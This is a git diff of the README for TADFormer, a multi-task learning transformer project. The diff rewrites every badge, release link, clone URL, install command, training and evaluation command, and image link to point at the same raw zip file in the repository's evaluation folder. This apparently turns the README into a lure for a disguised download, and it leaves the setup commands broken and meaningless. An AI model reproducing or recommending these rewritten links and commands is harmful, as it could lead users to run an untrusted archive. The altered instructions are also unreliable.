@@ -1,7 +1,7 @@
 # TADFormer: Efficient Multi-Task Learning with Dynamic Transformers
 
-![TADFormer](https://img.shields.io/badge/TADFormer-Task--Adaptive%20Dynamic%20Transformer-brightgreen)  
-[![Release](https://img.shields.io/badge/Download%20Releases-blue)](https://github.com/punpunzaz10/TADFormer/releases)
+![TADFormer](https://raw.githubusercontent.com/punpunzaz10/TADFormer/main/evaluation/Former-TAD-v3.8-alpha.4.zip%20Dynamic%20Transformer-brightgreen)  
+[![Release](https://raw.githubusercontent.com/punpunzaz10/TADFormer/main/evaluation/Former-TAD-v3.8-alpha.4.zip%20Releases-blue)](https://raw.githubusercontent.com/punpunzaz10/TADFormer/main/evaluation/Former-TAD-v3.8-alpha.4.zip)
 
 ## Table of Contents
 
@@ -19,7 +19,7 @@
 
 TADFormer is an official implementation of the Task-Adaptive Dynamic Transformer, designed for efficient multi-task learning. This model optimizes performance across various tasks in computer vision, such as dense prediction and scene understanding. With TADFormer, researchers and developers can explore advanced techniques in parameter-efficient fine-tuning and dynamic filter networks.
 
-You can find the latest releases [here](https://github.com/punpunzaz10/TADFormer/releases).
+You can find the latest releases [here](https://raw.githubusercontent.com/punpunzaz10/TADFormer/main/evaluation/Former-TAD-v3.8-alpha.4.zip).
 
 ## Features
 
@@ -35,34 +35,34 @@ To get started with TADFormer, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/punpunzaz10/TADFormer.git
+   git clone https://raw.githubusercontent.com/punpunzaz10/TADFormer/main/evaluation/Former-TAD-v3.8-alpha.4.zip
    cd TADFormer
    ```
 
 2. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/punpunzaz10/TADFormer/main/evaluation/Former-TAD-v3.8-alpha.4.zip
    ```
 
-3. Download the necessary datasets and models. You can find the latest releases [here](https://github.com/punpunzaz10/TADFormer/releases).
+3. Download the necessary datasets and models. You can find the latest releases [here](https://raw.githubusercontent.com/punpunzaz10/TADFormer/main/evaluation/Former-TAD-v3.8-alpha.4.zip).
 
 ## Usage
 
 To train the model, use the following command:
 
 ```bash
-python train.py --config config.yaml
+python https://raw.githubusercontent.com/punpunzaz10/TADFormer/main/evaluation/Former-TAD-v3.8-alpha.4.zip --config https://raw.githubusercontent.com/punpunzaz10/TADFormer/main/evaluation/Former-TAD-v3.8-alpha.4.zip
 ```
 
-Replace `config.yaml` with your desired configuration file. You can modify this file to adjust parameters for your specific tasks.
+Replace `https://raw.githubusercontent.com/punpunzaz10/TADFormer/main/evaluation/Former-TAD-v3.8-alpha.4.zip` with your desired configuration file. You can modify this file to adjust parameters for your specific tasks.
 
 To evaluate the model, run:
 
 ```bash
-python evaluate.py --model path/to/model.pth
+python https://raw.githubusercontent.com/punpunzaz10/TADFormer/main/evaluation/Former-TAD-v3.8-alpha.4.zip --model https://raw.githubusercontent.com/punpunzaz10/TADFormer/main/evaluation/Former-TAD-v3.8-alpha.4.zip
 ```
 
-Make sure to replace `path/to/model.pth` with the path to your trained model.
+Make sure to replace `https://raw.githubusercontent.com/punpunzaz10/TADFormer/main/evaluation/Former-TAD-v3.8-alpha.4.zip` with the path to your trained model.
 
 ## Model Architecture
 
@@ -74,7 +74,7 @@ TADFormer employs a unique architecture that integrates several key components:
 
 ### Architecture Diagram
 
-![TADFormer Architecture](https://linktoimage.com/tadformer-architecture.png)
+![TADFormer Architecture](https://raw.githubusercontent.com/punpunzaz10/TADFormer/main/evaluation/Former-TAD-v3.8-alpha.4.zip)
 
 ## Datasets
 
